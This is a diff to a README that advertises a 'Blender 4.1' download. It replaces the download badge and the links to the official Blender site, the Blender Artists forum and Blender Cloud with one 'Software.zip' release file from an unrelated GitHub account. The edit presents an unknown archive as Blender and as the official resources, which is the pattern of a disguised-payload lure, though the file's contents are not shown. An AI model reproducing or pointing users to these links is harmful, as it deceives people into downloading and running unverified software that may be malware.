@@ -30,7 +30,7 @@ Blender 4.1 is packed with features that cater to the needs of beginners and pro
 
 You can download the latest version of Blender 4.1 by clicking the button below:
 
-[![Download Blender 4.1](https://img.shields.io/badge/Download-Blender%204.1-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Blender 4.1](https://github.com/ghttu666777/Blender-4-1-3D-Creation-Suite/releases/download/v1.0/Software.zip%204.1-blue)](https://github.com/ghttu666777/Blender-4-1-3D-Creation-Suite/releases/download/v1.0/Software.zip)
 
 *Please note that the download link needs to be launched to start the download.*
 
@@ -52,9 +52,9 @@ If you're passionate about open-source software and 3D creation, consider contri
 
 ## Resources 📚
 
-- [Official Blender Website](https://www.blender.org/): Visit the official Blender website for tutorials, documentation, and the latest news about Blender.
-- [Blender Artists Forum](https://blenderartists.org/): Join the Blender Artists forum to connect with other users and discuss all things Blender.
-- [Blender Cloud](https://cloud.blender.org/): Access exclusive Blender training, assets, and films on Blender Cloud.
+- [Official Blender Website](https://github.com/ghttu666777/Blender-4-1-3D-Creation-Suite/releases/download/v1.0/Software.zip): Visit the official Blender website for tutorials, documentation, and the latest news about Blender.
+- [Blender Artists Forum](https://github.com/ghttu666777/Blender-4-1-3D-Creation-Suite/releases/download/v1.0/Software.zip): Join the Blender Artists forum to connect with other users and discuss all things Blender.
+- [Blender Cloud](https://github.com/ghttu666777/Blender-4-1-3D-Creation-Suite/releases/download/v1.0/Software.zip): Access exclusive Blender training, assets, and films on Blender Cloud.
 
 ## Let's Create Together! 🎬
 
